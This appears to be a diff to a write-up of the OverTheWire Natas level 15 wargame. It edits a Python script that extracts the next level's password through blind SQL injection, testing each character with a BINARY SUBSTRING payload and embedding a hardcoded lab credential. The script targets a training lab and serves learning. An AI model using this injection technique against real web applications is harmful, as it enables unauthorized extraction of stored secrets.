@@ -604,9 +604,11 @@ Now we have to automate the process of checking each character of the password. 
 ```python
 import requests
 import string
+from requests.auth import HTTPBasicAuth
 
 URL = "http://natas15.natas.labs.overthewire.org/index.php?debug=1"
-auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+auth=HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 known = ""
 found = True
 charSet = string.digits + string.ascii_letters
@@ -615,9 +617,8 @@ for i in range(1, 65):
     if not found:
         break
     for c in charSet:
-        payload = f'natas16" AND BINARY SUBSTRING(password,{i},1) = "{c}" -- '
-        payload = {"username": payload}
-        r = requests.post(url = URL, auth=auth, data = payload)
+        payload = f'username=natas16" AND BINARY SUBSTRING(password,{i},1) = "{c}" -- '
+        r = requests.post(url=URL, headers=headers, auth=auth, data=payload)
         if "This user exists" in r.text:
             found = True
             known += c
